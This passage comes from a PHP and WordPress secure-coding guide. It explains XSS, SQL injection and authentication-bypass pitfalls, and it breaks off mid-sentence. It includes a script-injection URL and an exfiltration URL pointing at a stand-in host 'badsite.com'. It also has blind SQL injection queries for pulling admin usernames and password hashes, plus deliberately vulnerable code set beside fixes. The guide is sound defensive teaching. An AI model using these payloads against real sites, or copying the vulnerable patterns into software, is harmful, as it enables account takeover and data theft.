you can see, if the developer was validating, sanitizing and escaping
correctly at input and output, they would have had several opportunities
to catch this kind of attack.

Shell Commands

A shell command is another data output vector in your application. It is
a place where you could potentially output user-data which may allow an
attacker to trick your application into executing undesirable shell
commands.

It is unusual to execute shell commands from a PHP web application and
in general we recommend against it. Instead use built-in PHP functions
to do things like directory listings, file manipulation, text searching
in files and so on. Very occasionally, shell commands are unavoidable.
If you are executing a shell command, we strongly recommend against
including any user data or data that has arrived from an external
source.

If you absolutely must execute a shell command in PHP that involves
external data, you should use very strict validation, sanitization and
escaping. Functions like 'intval()' that strip out everything except
integers are useful for sanitization in this scenario.

The End of The Beginning

This brings us to the conclusion of our introduction to PHP security. We
haven't looked at much code yet. This was a conceptual introduction to
help you understand how vulnerabilities are introduced into an
application, how they are avoided and to which areas of your application
you should be paying attention. We go into more detail in the coming
sections.

As you can tell from the above graphic, if you are able to fully
understand and eliminate just the XSS vulnerabilities in your PHP code,
you will be writing 47% less vulnerabilities. So lets spend some time
discussing XSS, what it is, how it is exploited and how to prevent XSS
vulnerabilities.

What is an XSS vulnerability?

XSS vulnerabilities are incredibly easy to write. In fact, if you simply
write PHP in a way that feels intuitive, you will almost certainly write
an XSS vulnerability into your code. Thankfully XSS vulnerabilities are
also very easy to recognize.

  ------------------------------------------------------------------------
  1   echo \"The value you entered is: \" . \$\_GET\[\'val\'\];
  --- --------------------------------------------------------------------

  ------------------------------------------------------------------------

That is a classic XSS vulnerability. If you include this code in a
WordPress plugin, publish it and your plugin becomes popular, you can
have no doubt that a security analyst will at some point contact you
reporting this vulnerability. You will have to fix it and the analyst
will publicly disclose it, leaving you slightly embarrassed, but with a
more secure application.

So why is this an XSS vulnerability? The way the above code works is it
grabs a value from the URL and writes it back to the browser,
unvalidated and unfiltered. If your application is hosted at
https://example.com/test.php a site visitor might visit the following
URL:

https://example.com/test.php?val=123

They will then see: "The value you entered is: 123" output into their
browser. Probably the way the application was designed to work.

If someone visits the following URL:

https://example.com/test.php?val=\<script\>alert('Proof this is an
XSS');\</script\>

They will see the following in the browser: "The value you entered is:"
and they will also see an alert box pop up saying "Proof this is an
XSS".

Why is unfiltered output dangerous?

A demonstration showing an alert box doesn't seem like much of a threat.
If you don't fully understand the impact of an XSS vulnerability and
someone reports this issue to you with an alert() box as a demonstration
of the vulnerability, you might be inclined to not take it seriously.
How can proof that you can execute javascript be proof of a serious
security problem?

When an analyst sends you an alert() box as proof of a security
vulnerability, they are showing that they can execute arbitrary
javascript code in the browser. What they are really demonstrating is
that by sending that URL to someone else, they can get that other person
to execute arbitrary javascript in a browser.

One version of an exploit might look something like this:

https://example.com/test.php?val=\<script
src="http://badsite.com/badscript.js"\>\</script\>

The attacker will send that link to a victim. The steps are as follows:

-   The victim clicks the link and visits the site. Let's assume they're
    already signed into the website with administrator level access.

-   The link and the XSS vulnerability cause the script to load from an
    external website into the target web page.

-   The script will have full access to the browser DOM environment
    including any HTTP cookie not protected by the HttpOnly flag.

-   The script performs a malicious action as the signed-in user. It
    also steals data from the website accessible to the signed in user
    (e.g. private messages the user has received) and sends it to the
    attacker. The data can be sent in a variety of ways, but one way
    could be to load an image like this from an external website:
    http://badsite.com/badPretendImage.jpg?stolendata=secretDataValues.
    The badPretendImage.jpg is actually a script that serves up an image
    but also stores any data received.

That is the basic mechanism of exploitation for an XSS vulnerability: An
attacker finds a way to get a victim to load their javascript using an
XSS vulnerability in the website. They use that to steal data from
browsers.

In the example above, we have loaded an external javascript file into
the page. XSS vulnerabilities vary and for a particular vulnerability it
might not be feasible to include \<SCRIPT\> tags that load an entire
external script. If that does not work, what could work is to add
javascript directly in the exploit that is executed and performs some
malicious action.

What is the HttpOnly flag and why is it important?

Before Internet Explorer version 6SP1, cookies were accessible both to
web servers when a browser made a request, and to javascript. In other
words, a script running in the browser on a particular website could
simply read all cookies that the website had set.

This provided much flexibility to developers but also allowed malicious
scripts to read cookie values and send them anywhere on the Internet. If
an attacker was able to exploit an XSS vulnerability, the first thing
they would do would be to steal any cookies they could read. This would
allow them to gain instant administrative level access to websites if
the victim was signed into the target website as an administrator.

In 2002, Microsoft released a feature with Internet Explorer Service
Pack 1 that provided an optional special flag that could be set when a
cookie was set. The flag is called HttpOnly and it specified that any
cookies that included the HttpOnly flag must not be readable by
javascript and should only be sent to the web server that set the cookie
via HTTP. Hence the name 'HttpOnly'. The feature was quickly adopted by
other browser vendors because the security benefits were clear. This
flag provided a robust way to protect sensitive cookies from XSS
attacks. Today all major browser vendors support the HttpOnly flag.

WordPress also uses the HttpOnly flag to protect cookies, which prevents
an attacker exploiting an XSS vulnerability from stealing sensitive
cookies.

**Tip: **Changing the password of a WordPress user invalidates their
cookies immediately. This can be used to sign out a user in the case of
a suspected breach.

What is a Reflected XSS Vulnerability?

What we've discussed above is a reflected XSS vulnerability. A reflected
XSS attack is usually a link that contains malicious code. When someone
clicks on that link, they are taken to a vulnerable website and that
malicious code is 'reflected' back into their browser to perform some
malicious action.

Reflected XSS attacks are much less dangerous than stored XSS
vulnerabilities (see below) for several reasons:

Reflected XSS attacks rely on a victim taking some kind of action
whereby they visit the target website and cause it to generate content
that performs a malicious action in their browser. This makes reflected
XSS attacks very difficult or sometimes impossible to automate. Each
victim must be targeted individually with an email or some other content
that contains a malicious link which they need to click in order to be
targeted in the attack.

Stored (or Persistent) XSS Vulnerabilities

A stored XSS attack is much more dangerous for two reasons.

**First, a stored XSS attack can be automated.** A script can be created
that visits thousands of websites, exploits a vulnerability on each site
and drops a stored XSS payload.

**Second, victims in a stored XSS attack don't have to take any action
other than visiting the affected website.** Anyone that visits the
affected page on the site will become a victim because the stored
malicious code will load in their browser. The victims do not need to
take an additional action, like clicking an emailed link, to be
affected.

A stored XSS attack occurs when an attacker sends malicious data to a
website that is stored in a database or some other storage mechanism.
Then when other site visitors visit a page or a specific URL, they are
served that data which executes and performs some kind of malicious
action.

Lets look at an example:

![Screen Shot 2015-10-28 at 11.07.46
PM](media/image1.png){width="7.720833333333333in"
height="3.779166666666667in"}

The above code is a very basic guest book application. It's also a
classic example of a stored XSS vulnerability. When you load this
application you will see a form asking you to sign a guest book that
looks like this:

![Screen Shot 2015-10-28 at 11.09.53
PM](media/image2.png){width="4.1618055555555555in"
height="2.0590277777777777in"}

Once you sign the guest book a few times, you'll see something like
this:

![Screen Shot 2015-10-28 at 11.10.47
PM](media/image3.png){width="4.1618055555555555in"
height="1.6909722222222223in"}

If you enter some javascript in the signature text box that executes an
alert box, you'll see this:

![Screen Shot 2015-10-28 at 11.12.49
PM](media/image4.png){width="4.1618055555555555in"
height="2.073611111111111in"}

What happened here is a guest entered some javascript in the "Sign it"
field that looks like this:

  ------------------------------------------------------------------------
  1   \<script\>alert(\'XSS Expoit worked\');\</script\>
  --- --------------------------------------------------------------------

  ------------------------------------------------------------------------

The javascript was stored and is now served up to every visitor to the
guestbook page. This is a **stored XSS vulnerability** which has a much
wider impact than a reflected XSS vulnerability. It can be used to steal
data from every visitor to the affected page, not just visitors who
click a specially crafted link. For this reason, stored XSS
vulnerabilities are much more serious than reflected XSS.

Fixing this vulnerability is easy by validating input and sanitizing and
escaping output. Let's apply that to this script. Review the changes
below.

![Screen Shot 2015-10-28 at 11.31.25
PM](media/image5.png){width="10.690972222222221in" height="5.0in"}

As you can see in the above example we're validating the data using a
regular expression. We now only allow a small subset of characters in
the guestbook. Even though we don't allow HTML tags, we run the data
through PHP's filter_var() function with the FILTER_SANITIZE_STRING
filter to sanitize the string which will strip out any tags that might
slip through due to a bug in our code. FILTER_SANITIZE_STRING actually
removes any tags it finds.

Then, when we output each record in the guestbook, we use filter_var
with the FILTER_SANITIZE_FULL_SPECIAL_CHARS filter which does not strip
out tags, but it escapes them if they are present. So in the example
above we are validating and sanitizing on input and we are escaping on
output. This provides plenty of protection against a stored XSS in the
case of a guestbook.

**A further note on the above code:** You probably noticed a few other
things we could make more secure. For example, we are storing our
guestbook in a file which is in a web accessible folder. That means the
raw data is readable by the public. This in itself is undesirable, and
giving an attacker read access to a file that is not designed for public
consumption may introduce further vulnerabilities. One way to solve this
is to create a data file but give it a PHP extension. Then make the
first line of the file contain the following:

  ------------------------------------------------------------------------
  1   \<?php **die**(\"Nothing to see here!\"); ?\>
  --- --------------------------------------------------------------------

  ------------------------------------------------------------------------

When you write to the file, make sure that first line stays intact. When
you read the file, always discard the first line. Store the file with a
.php extension e.g. data.php. Then if an attacker tries to access the
file, the web server will treat it as executable PHP and immediately
exit.

Functions to Validate your Data

Validation in programming is when you verify that the data your
application has received falls within constraints that you define to
ensure it does not contain anything unreasonable, unnecessary or
malicious. **Validation is not a replacement for sanitization or
escaping**, because as we will see (in the section discussing
filter_var() below), malicious data can get past a some validation
functions.

The constraints you will use vary, but they frequently are similar to
the constraints used within a strictly typed language. For example, you
might use some of the following checks:

-   Is data an integer. (0 to 9 digits only)

-   Is data a float with a decimal point allowed. (0 to 9 and .
    character)

-   Is data numbers and dashes e.g. a credit card date field.

-   Is data a string with numbers, letters, spaces and punctuation only.

-   Is data one of a limited number of options that can be selected e.g.
    'option1', 'option2', 'option3'

During validation if you reject data you will often return an error to
the user describing the problem and asking them for correct data.

Below we have included functions that are frequently used by PHP
developers to check if data received by an application is valid (to
validate data). These are usually used in an if() statement to check if
data is valid and if not, the application returns an error to the user.

  ---------------------------------------------------------------------------------------------------------
  **Function**   **What it     **Example**
                 Does**        
  -------------- ------------- ----------------------------------------------------------------------------
  is_numeric()   Tests if data is_numeric(\$input) will return true if \$input == '-9.123'
                 matches 0 to  
                 9 with        
                 optional sign 
                 and optional  
                 decimal       
                 point.        

  preg_match()   Test if data  preg_match('/\^\[a-z\]{2,3}\$/', \$input) returns true if \$input is
                 matches       lowercase letters either 2 or 3 characters long. Note the \^ and \$ in the
                 regular       regex.
                 expression.   

  filter_var()   Test if data  filter_var(\$input, FILTER_VALIDATE_EMAIL) tests if \$input is a valid email
                 conforms to a address. Other useful filters are FILTER_VALIDATE_IP, FILTER_VALIDATE_URL,
                 built-in PHP  FILTER_VALIDATE_BOOLEAN. [[You can find more filters
                 filter.       here.]{.underline}](https://php.net/manual/en/filter.filters.validate.php)

  in_array()     Tests if data in_array(\$input, array('Windows', 'Linux', 'OSX', 'Other')) will return
                 is one of a   true if \$input contains one of the allowed values. Great for \<select\>
                 range of      fields and radio buttons on web forms.
                 allowed       
                 values.       
  ---------------------------------------------------------------------------------------------------------

How to safely use regular expressions for validation

When using regular expressions with preg_match() to validate data, make
sure that you match the entire string by using a caret \^ character at
the start of your regular expression and a dollar sign \$ at the end.
These match the start and end of a string and will ensure that you
aren't just validating something in the middle of the input but are
validating the whole string. Leaving these out creates a serious
security problem because an attacker can include some valid data which
will pass your test, but prepend or append anything malicious they want.

**Using filter_var() for validation does not replace sanitization or
escaping.**

In general, the filter_var() function is used as follows to validate
data as it arrives in your application:

+---+---------------------------------------------------------------------+
| 1 | **if**(\$test = filter_var(\'test@example.com\',                    |
|   | FILTER_VALIDATE_EMAIL)){                                            |
| 2 |                                                                     |
|   |         echo \"Received: \$test\\n\";                               |
| 3 |                                                                     |
|   | }                                                                   |
+===+=====================================================================+
+---+---------------------------------------------------------------------+

If you replace the email above with 'test@example.com\<script\>' you
will see that the check fails and the echo statement is not executed.

Consider the following example which demonstrates how malicious data can
get past a validation step. This shows how validation is no substitute
for sanitization and escaping on output.

+---+----------------------------------------------------------------------+
| 1 | **if**(\$test =                                                      |
|   | filter_var(\'[[http://example.com/?]{.underline}](                   |
| 2 | http://example.com/?)\"\>\<script\>alert(\"XSS\")\</script\>\<a\"\', |
|   | FILTER_VALIDATE_URL)){                                               |
| 3 |                                                                      |
|   |         echo \"Received: \$test\\n\";                                |
|   |                                                                      |
|   | }                                                                    |
+===+======================================================================+
+---+----------------------------------------------------------------------+

The example above will output the following:

  ------------------------------------------------------------------------------------------------------------
  1   Received:
      [[http://example.com/?]{.underline}](http://example.com/?)\"\>\<script\>alert(\"XSS\")\</script\>\<a\"
  --- --------------------------------------------------------------------------------------------------------

  ------------------------------------------------------------------------------------------------------------

This creates an XSS vulnerability if this output is unsanitized and
unescaped. Changing the code as follows will remove the XSS
vulnerability:

+---+----------------------------------------------------------------------+
| 1 | **if**(\$test =                                                      |
|   | filter_var(\'[[http://example.com/?]{.underline}](                   |
| 2 | http://example.com/?)\"\>\<script\>alert(\"XSS\")\</script\>\<a\"\', |
|   | FILTER_VALIDATE_URL)){                                               |
| 3 |                                                                      |
|   |         echo \"Received: \" . esc_url(\$test) . \"\\n\";             |
|   |                                                                      |
|   | }                                                                    |
+===+======================================================================+
+---+----------------------------------------------------------------------+

The above code will output the following, which is safe:

  ---------------------------------------------------------------------------------------------------
  1   Received:
      [[http://example.com/?scriptalert]{.underline}](http://example.com/?scriptalert)(XSS)/scripta
  --- -----------------------------------------------------------------------------------------------

  ---------------------------------------------------------------------------------------------------

See below for more information on functions you can use for escaping and
sanitization.

Functions to Escape and Sanitize your Data

When you're ready to output data back to a visitor's web browser, a
file, a network or some other place that data leaves your application,
you will need to ensure the data you are outputting is safe. PHP and
WordPress provide a variety of functions that escape and/or sanitize
your data. It's important to note that these functions will change your
data if needed to make it safe.

PHP Built-in Sanitization and Escaping Functions

The following functions are built into PHP and you can use them whether
or not you are running your application inside the WordPress
environment. You'll notice we provide several filter_var() examples.
This is the new standard in PHP sanitization and is included by default
with PHP since PHP version 5.2. We recommend using filter_var() instead
of older PHP functions.

  -----------------------------------------------------------------------------------------------------------------------------------------------------
  **Function**                               **Output**               **Description**
  ------------------------------------------ ------------------------ ---------------------------------------------------------------------------------
  intval('123AA456')                         123                      Sanitize integers.
                                                                      \[[[docs]{.underline}](https://php.net/manual/en/function.intval.php)\]

  filter_var('mark\<script\>@example.com',   markscript@example.com   Sanitize emails.
  FILTER_SANITIZE_EMAIL)                                              \[[[docs]{.underline}](https://php.net/manual/en/filter.filters.sanitize.php)\]

  filter_var('Testing \<tags\> & chars.',    Testing &#60;tags&#62;   Encode special chars.
  FILTER_SANITIZE_SPECIAL_CHARS)             &#38; chars.             \[[[docs]{.underline}](https://php.net/manual/en/filter.filters.sanitize.php)\]

  filter_var('Strip \<tag\> & encode.',      Strip & encode.          Remove tags.
  FILTER_SANITIZE_STRING);                                            \[[[docs]{.underline}](https://php.net/manual/en/filter.filters.sanitize.php)\]

  filter_var('Strip \<tag\> & encode.',      Strip &#38; encode.      Remove tags with extra encoding flags.
  FILTER_SANITIZE_STRING,                                             \[[[docs]{.underline}](https://php.net/manual/en/filter.filters.sanitize.php)\]
  FILTER_FLAG_ENCODE_LOW \|                                           
  FILTER_FLAG_ENCODE_HIGH \|                                          
  FILTER_FLAG_ENCODE_AMP)                                             
  -----------------------------------------------------------------------------------------------------------------------------------------------------

WordPress API Sanitization Functions

WordPress includes a range of sanitization functions that are designed
for specific use cases. We've included example usages below that give
you an idea of how data is changed by these functions.

  -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  **Function**                                                                      **Output**                                  **Description**
  --------------------------------------------------------------------------------- ------------------------------------------- -----------------------------------------------------------------------------------------------
  absint('-123ABC')                                                                 123                                         Sanitizes positive integers.
                                                                                                                                \[[[docs]{.underline}](https://codex.wordpress.org/Function_Reference/absint)\]

  sanitize_email("!#\$%\^&\*()\_\_+=-{}\|\\\]\[:\\"\\';\<\>?/.,test@example.com")   !#\$%\^&\*\_\_+=-{}\|'?/.test@example.com   Sanitize email addresses.
                                                                                                                                \[[[docs]{.underline}](https://codex.wordpress.org/Function_Reference/sanitize_email)\]

  sanitize_file_name('.-\_/path/to/file--name.txt');                                pathtofile-name.txt                         Sanitize filenames.
                                                                                                                                \[[[docs]{.underline}](https://codex.wordpress.org/Function_Reference/sanitize_file_name)\]

  sanitize_html_class('class!@#\$%\^&\*()-name_here.');                             class-name_here                             Sanitize CSS class names.
                                                                                                                                \[[[docs]{.underline}](https://codex.wordpress.org/Function_Reference/sanitize_html_class)\]

  sanitize_key('KeY-Name!@#\$%\^&\*()\<\>,.?/');                                    key-name                                    Sanitize keys for associative arrays.
                                                                                                                                \[[[docs]{.underline}](https://codex.wordpress.org/Function_Reference/sanitize_key)\]

  sanitize_mime_type('text/plain-blah!@#\$%\^&\*()}{\[\]":;\>\<,.?/');              text/plain-blah\*./                         Sanitize mime types.
                                                                                                                                \[[[docs]{.underline}](https://codex.wordpress.org/Function_Reference/sanitize_mime_type)\]

  sanitize_option('thumbnail_size_h', '123ABC-\_');                                 123                                         Sanitize WP option. Filtering type depends on option name.
                                                                                                                                \[[[docs]{.underline}](https://codex.wordpress.org/Function_Reference/sanitize_option)\]

  sanitize_sql_orderby('colName');                                                  colName                                     Sanitize a column name used in SQL 'order by'. Returns blank if invalid chars found.
                                                                                                                                \[[[docs]{.underline}](https://codex.wordpress.org/Function_Reference/sanitize_sql_orderby)\]

  sanitize_text_field('\<tag\>some text\</tag\>')                                   some text                                   Checks for invalid UTF-8, Convert single \< characters to entity, strip all tags, remove line
                                                                                                                                breaks, tabs and extra white space, strip octets.
                                                                                                                                \[[[docs]{.underline}](https://codex.wordpress.org/Function_Reference/sanitize_text_field)\]

  sanitize_title('\<tag\>\<?php //blah ?\>Title here');                             title-here                                  Turns text into a slug-style title for use in a URL.
                                                                                                                                \[[[docs]{.underline}](https://codex.wordpress.org/Function_Reference/sanitize_title)\]

  sanitize_user('\<tag\>123ABCdef \_.-\*@name!#\$', true);                          123ABCdef \_ .-@name                        Sanitize WP usernames. Second param enables strict sanitization.
                                                                                                                                \[[[docs]{.underline}](https://codex.wordpress.org/Function_Reference/sanitize_user)\]
  -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

WordPress API Escaping Functions

WordPress also includes escaping functions for general use. We have
included the main functions below with example input and output to
illustrate their use.

  ---------------------------------------------------------------------------------------------------------------------------------------------------------------------
  **Function**                             **Output**                           **Comments**
  ---------------------------------------- ------------------------------------ ---------------------------------------------------------------------------------------
  esc_html('\<tag\> & text');              &lt;tag&gt; &amp; text               Escape HTML for safe browser output.
                                                                                \[[[docs]{.underline}](https://codex.wordpress.org/Function_Reference/esc_html)\]

  esc_url('http://example.com/\            http://example.com/\                 Escape URLs to make them safe for output as text or HTML attributes.
  \<script\>alert("TEST");\</script\>');   scriptalert(TEST);/script            \[[[docs]{.underline}](https://codex.wordpress.org/Function_Reference/esc_url)\]

  esc_js('alert("1");');                   alert(&quot;1&quot;);                Escapes Javascript to make it safe for inline HTML use e.g. in onclick handler.
                                                                                \[[[docs]{.underline}](https://codex.wordpress.org/Function_Reference/esc_js)\]

  esc_attr('attr-\<\>&\\\'"name');         attr-&lt;&gt;&amp;&#039;&quot;name   Use to escape HTML attributes e.g. alt, title, value, etc.
                                                                                \[[[docs]{.underline}](https://codex.wordpress.org/Function_Reference/esc_attr)\]

  esc_textarea('Text \<tag\> & text');     Text &lt;tag&gt; &amp; text          Escape text for output in \<textarea\> element.
                                                                                \[[[docs]{.underline}](https://codex.wordpress.org/Function_Reference/esc_textarea)\]
  ---------------------------------------------------------------------------------------------------------------------------------------------------------------------

The wp_kses() function

The [[wp_kses()]{.underline}](https://codex.wordpress.org/Function_Reference/wp_kses) is
a more complex sanitization function. It strips evil scripts. That is
where the name comes from: "kses strips evil scripts". When you use
wp_kses() you will need to include an array of tags and the allowed
attributes for each tag as the second parameter to kses. Here's an
example:

+---+---------------------------------------------------------------------+
| 1 | \$allowed = **array**(                                              |
|   |                                                                     |
| 2 |    \'a\' =\> **array**( \'href\' =\> **array**(), \'title\' =\>     |
|   | **array**() ),                                                      |
| 3 |                                                                     |
|   |    \'br\' =\> **array**(),                                          |
| 4 |                                                                     |
|   |    \'em\' =\> **array**(),                                          |
| 5 |                                                                     |
|   |    \'strong\' =\> **array**(),                                      |
| 6 |                                                                     |
|   | );                                                                  |
| 7 |                                                                     |
|   |                                                                     |
| 8 |                                                                     |
|   | echo wp_kses(\$output, \$allowed);                                  |
+===+=====================================================================+
+---+---------------------------------------------------------------------+

The above will allow the 'A' tag with 'href' and 'title' attributes. It
will also allow the following tags with no attributes: br, em and
strong. If attributes are included with those tags, they will be
stripped out.

wp_kses() is very processor intensive because the code is complex. So in
general we recommend you first try to use built in PHP functions because
they are fastest, then the simpler WordPress sanitization and escaping
functions, and then only use wp_kses() if you must. That will give you
the best performance for your plugin or theme.

Conclusion

By following the basic guidelines on this page you can avoid the most
common vulnerabilities that are introduced into code. In general,
spending time on input validation and output sanitization and escaping
will make your application safe.

When choosing functions for sanitization and escaping, choose the
function that most closely matches your specific use case. If you are
outputting data into an HTML attribute, use a sanitization or escaping
function specific for HTML attributes. This will give you the best
combination of application performance and security.

If you are able to avoid XSS vulnerabilities and secure your application
output, you will avoid almost half of all vulnerabilities that might be
introduced into your application.

What is a SQL injection vulnerability?

Most useful WordPress plugins have some kind of interaction with the
database. User input is frequently sent to the database, either because
it needs to be stored in the DB, it needs to modify something in the DB,
or because it is being used as part of a SELECT statement. If user input
is not properly validated and escaped, an attacker can replace that user
input with commands they can send directly to the database.

There are two kinds of SQL injection. A 'classic' SQL injection
vulnerability is one where unfiltered user input lets an attacker send
commands to the database and the output is sent back to the attacker. A
'blind' SQL injection vulnerability is when the attacker can send
commands to the database but they don't actually see the database
output.

What is the impact of a SQL injection vulnerability?

In the following video, we create a WordPress plugin that contains a SQL
injection vulnerability. Then we demonstrate how to attack our test
website and exploit the vulnerability. We get a list of databases we
have access to, view the tables in the database and download sensitive
personally identifiable information (PII).

This is a clear demonstration of the devastating impact that SQLi
vulnerabilities can have on a business. We encourage you to watch the
video and pause where necessary to view source code or command details.

How a Classic SQL Injection Vulnerability Works

To understand how a classic SQL injection vulnerability works, lets look
at a WordPress example:

+---+----------------------------------------------------------------------+
| 1 | **global** \$wpdb;                                                   |
|   |                                                                      |
| 2 | \$title = \$wpdb-\>get_var(\"select post_title from \" .             |
|   | \$wpdb-\>posts . \" where ID=\" . \$\_GET\[\'id\'\]);                |
| 3 |                                                                      |
|   | echo \$title;                                                        |
+===+======================================================================+
+---+----------------------------------------------------------------------+

The above code is an example of a SQL injection (SQLi) vulnerability. It
is an SQLi vulnerability because the user input in \$\_GET\['id'\] is
sent directly to the database without sanitization or escaping. This
allows an attacker to send commands directly to the database.

The database output is then sent directly back to the user's browser.
Because the output is sent to the browser, this makes the vulnerability
a classic SQLi vulnerability, as opposed to a blind SQL injection
vulnerability, which is discussed below.

Using this vulnerability an attacker can send commands directly to the
database. These include SELECT commands to download your entire database
including any user personally identifiable information (PII). In some
cases it also includes INSERT and UPDATE commands to create new user
accounts or modify existing user accounts.

To fix the above vulnerability is relatively easy. In WordPress you
simply need to use the prepare method which will automatically sanitize
and escape any data you send to the database. The above code can be
modified as follows to remove the SQLi vulnerability:

+---+----------------------------------------------------------------------+
| 1 | **global** \$wpdb;                                                   |
|   |                                                                      |
| 2 | \$title = \$wpdb-\>get_var(\$wpdb-\>prepare(\"select post_title from |
|   | \" . \$wpdb-\>posts . \" where ID=%d\", \$\_GET\[\'id\'\]));         |
| 3 |                                                                      |
|   | echo \$title;                                                        |
+===+======================================================================+
+---+----------------------------------------------------------------------+

Note that we use the \$wpdb-\>prepare() method to escape the data we are
sending the database. It has a syntax that is similar to the sprintf()
function which allows you to use placeholders. A %d is an integer, %f is
a float (or decimal) and %s is a string (or text). If you are using %s
as a placeholder, you don't need to include quotes as these are added
automatically.

How a Blind SQL Injection Works

A blind SQL injection vulnerability looks like the following:

+---+----------------------------------------------------------------------+
| 1 | **global** \$wpdb;                                                   |
|   |                                                                      |
| 2 | \$title = \$wpdb-\>get_var(\"select post_title from \" .             |
|   | \$wpdb-\>posts . \" where ID=\" . \$\_GET\[\'id\'\]);                |
| 3 |                                                                      |
|   | //Do something with title, but don\'t echo.                          |
+===+======================================================================+
+---+----------------------------------------------------------------------+

In the above example, raw unsanitized user input is sent directly to the
database by concatenating the \$\_GET\['id'\] variable directly to the
SQL query. To fix this vulnerability, you would simply use the prepare()
method as above to sanitize and escape any database input.

The difference here is that the output is never sent to the browser. A
blind SQLi vulnerability is just as serious as a regular SQLi
vulnerability because an attacker can in some cases easily insert or
update data in your database. The difference is that it becomes more
difficult to extract data from the database because the attacker can't
see the output of the database because it is not written to the web
browser.

Time based blind SQL attacks

There are generally two ways an attacker extracts data from a database
using a blind SQL injection attack. The first is using a time based
attack. Lets assume that, using the above SQLi vulnerability an attacker
can send any command to the database, but they can't see the output.
They can only see the resulting web page.

An attacker might ask the database a question like "Does the first
letter of the first admin account start with 'a'? If it does, then sleep
for 5 seconds and if it does not, don't sleep at all. If it takes less
than 5 seconds for the web page to be generated and return to the web
browser, they know that the admin account does not start with the letter
'a' and they move on the the next letter, 'b' and ask the same question.

Using this technique, an attacker can launch a time based attack on a
website and determine the names of admin accounts and they can extract
hashed user passwords.

The actual SQL sent to the database might look like the following:

+---+---------------------------------------------------------------------+
| 1 | **select** post_title **from** wp_posts **where** ID=1              |
|   |                                                                     |
| 2 |   **union** **select** IF(                                          |
|   |                                                                     |
| 3 |     substring(wp_users.user_login,1,1)=\'a\',                       |
|   |                                                                     |
| 4 |     BENCHMARK(5000000,ENCODE(\'blah\',\'asdf\')),                   |
|   |                                                                     |
| 5 |     null)                                                           |
|   |                                                                     |
| 6 |   **from** wp_users **where** ID=1                                  |
+===+=====================================================================+
+---+---------------------------------------------------------------------+

What this SQL says is "select the post_title where the post ID is 1, but
merge in a query that will take a lot of time if we guess that the user
account with ID 1 (which is usually an admin account) has the letter 'a'
as the first letter of the username."

When this query is run, if the page takes a long time to load, the
attacker has correctly guessed the first letter of the admin username.
They can then move on to letter two and three until they have your admin
username. Once they have that, they can extract your admin hashed
password, your admin email, any user email or any data they want,
provided they take enough time to run the attack.

Remember, these attacks are automated and incorrect guesses take no time
at all, so data can be extracted relatively quickly using this
technique.

Content based blind SQL injection attacks

A content based blind SQL injection attack is another way for an
attacker to extract data from a database when they can't see the
database output.

If the query generating the content is the following (remember, the
query output is not sent to the user)

  ------------------------------------------------------------------------
  1   **select** post_status **from** wp_posts **where** ID=1
  --- --------------------------------------------------------------------

  ------------------------------------------------------------------------

Lets assume that the value '1' above is an unfiltered query parameter
appended to the database query as in our above example. Thus an attacker
can control all text after 'ID='.

An attacker can append the following to the query to verify that if they
include a false condition, they will see unusual content generated:

  ------------------------------------------------------------------------
  1   **select** post_status **from** wp_posts **where** ID=1 and 1=2
  --- --------------------------------------------------------------------

  ------------------------------------------------------------------------

1 is obviously not equal to 2 so in the above query the database will
return an empty result set. The attacker will examine the resulting page
and if it is a page with no content or an error message saying something
like 'no content', they will know what a response from an empty query
with a false condition looks like.

The attacker can then include something like the following:

+---+---------------------------------------------------------------------+
| 1 | **select** post_status **from** wp_posts **where** ID=1             |
|   |                                                                     |
| 2 |   and (**select** ID **from** wp_users **where**                    |
|   |                                                                     |
| 3 |   user_login=\'admin\' and ID=1)                                    |
+===+=====================================================================+
+---+---------------------------------------------------------------------+

The above query will be empty if the user in the database with ID 1 does
not have a username of 'admin'. It will however return the a non-empty
normal result to the browser if the user with ID 1 does have a username
of 'admin'. Using this technique an attacker can extract data from a
database by checking for non-empty and empty responses from the
application.

Another example of a content based blind SQL injection query is:

+---+---------------------------------------------------------------------+
| 1 | **select** post_status **from** wp_posts **where**                  |
|   |                                                                     |
| 2 |   ID=1 and (**select** 1 **from** wp_users **where**                |
|   |                                                                     |
| 3 |   substring(user_pass,1,1) = \'a\' and ID=1)                        |
+===+=====================================================================+
+---+---------------------------------------------------------------------+

The above query will check if the first letter of the hashed password
for user with ID 1 is an 'a'. Using this technique, an attacker can go
through every character and extract the hashed password for admin
accounts.

Conclusion

We have explained in detail how SQL injection vulnerabilities and blind
SQL injection vulnerabilities work. The key to avoiding these
vulnerabilities is to sanitize and escape anything you send to the
database. In WordPress the easiest way to do this is by using the
prepare() method and using placeholders in your SQL.

Now that you have an understanding of how attackers exploit these
vulnerabilities, you will be able to better protect your own websites
and those of your customers.

2.4: How to Prevent Authentication Bypass Vulnerabilities

Advanced

 

**Updated** May 6, 2024

Authentication bypass vulnerabilities are one of the less common
vulnerabilities we see, but they are also one of the easiest to
accidentally create as a WordPress plugin author. So we thought it would
be useful to include a short lesson on common pitfalls that lead to
these kinds of vulnerabilities.

Beware of is_admin()

There is a function in the WordPress API called is_admin(). If you are a
developer who is new to WordPress development, it's easy to assume that
this function checks if a site visitor **is **an **admin. **That is not
what this function does.

The is_admin() function actually checks if the administrator panel is
being displayed. It is a badly named function and we have seen multiple
developers make the mistake of using this function to try to verify if a
site visitor has access to an administrative function.

A common mistake is to create code that looks like the following:

+---+---------------------------------------------------------------------+
| 1 | **if**(is_admin()){ //Incorrect check to see if admin               |
|   |                                                                     |
| 2 |   add_action(\'wp_ajax_your_function\',                             |
|   | \'yourClass::yourFunction\');                                       |
| 3 |                                                                     |
|   | }                                                                   |
+===+=====================================================================+
+---+---------------------------------------------------------------------+

The is_admin() function is incorrectly used above to check if a visitor
is an admin. That is not what it does. If yourClass::yourFunction()
performs an operation that should only be accessible to an
administrator, then this is an authentication bypass vulnerability.

How to Correctly Check Permissions

To correctly check if a user should have access to a function, it is
important to understand a bit about WordPress permissions. When you
create a WordPress user, they have a certain role. There are six
predefined roles in WordPress:

-   Super Admin

-   Administrator

-   Editor

-   Author

-   Contributor

-   Subscriber

The above roles are in descending order of how much access they have.
These roles have what WordPress calls 'capabilities' or things they can
do. On a single WordPress site, the 'super admin' and 'administrator'
role are the same. 'super admin' has some extra capabilities on a
WordPress multi-site installation.

The table below gives you an idea of what each WordPress role is able to
do.

The API is fully documented
on [[WordPress.org]{.underline}](https://codex.wordpress.org/Roles_and_Capabilities#Capability_vs._Role_Table).

To check if a user is an administrator on a single-site WordPress
installation, you can change our above code to the following:

